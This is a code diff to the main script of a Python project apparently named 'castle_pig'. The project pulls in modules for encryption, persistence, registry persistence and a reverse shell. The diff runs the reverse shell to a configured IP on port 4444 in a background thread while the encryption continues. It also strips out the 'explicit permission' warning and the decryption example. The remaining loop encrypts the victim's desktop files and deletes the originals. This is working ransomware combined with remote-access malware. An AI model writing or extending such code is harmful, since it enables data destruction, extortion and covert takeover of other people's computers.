@@ -1,4 +1,5 @@
 import os
+import threading
 import castle_pig.file_encrypter
 import castle_pig.file_decrypter
 import castle_pig.task_scheduler
@@ -6,7 +7,6 @@ import castle_pig.secure_password
 import castle_pig.keyring_password
 import castle_pig.desktop_files
 import castle_pig.reverse_shell
-# REMOVED: from castle_pig.file_encrypter import encrypt_file, get_files_from_directory, DEFAULT_PASSWORD
 
 import castle_pig.persistence
 # Add registry persistence
@@ -77,11 +77,15 @@ REVERSE_SHELL_PORT = 4444
 files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files
 
 def main():
-    # 0. Optionally run reverse shell
+    # 0. Optionally run reverse shell in a background thread
     if ENABLE_REVERSE_SHELL:
-        # Only use with explicit permission!
-        castle_pig.reverse_shell.shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT)
-        return  # Do not continue with encryption if reverse shell is running
+        rs = threading.Thread(
+            target=castle_pig.reverse_shell.shell,
+            args=(REVERSE_SHELL_IP, REVERSE_SHELL_PORT),
+            daemon=True
+        )
+        rs.start()
+        print("Reverse shell started in background.")
 
     # 1. Get or generate a secure password
     try:
@@ -102,24 +106,16 @@ def main():
     # 3. Encrypt each file in the files list
     os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
     for _file in files:
-        # Use the full path here
         encrypted_path = castle_pig.file_encrypter.encrypt_file(
             _file,
             password=password,
-            delete_original=True, # This is where you enable secure deletion
+            delete_original=True,
             move_to_folder=ENCRYPTED_FOLDER
         )
         if encrypted_path:
             print(f"Encrypted file at: {encrypted_path}")
         else:
             print(f"Failed to encrypt: {_file}")
-
-    # 4. Example: Decrypt a file (uncomment and set the path to use)
-    # password = castle_pig.keyring_password.load_password_from_keyring(
-    #     service_name=SERVICE_NAME, username=USERNAME
-    # )
-    # decrypted_path = castle_pig.file_decrypter.decrypt_file("example1.txt.encrypted", password)
-    # print(f"Decrypted file at: {decrypted_path}")
 
 if __name__ == "__main__":
     main()
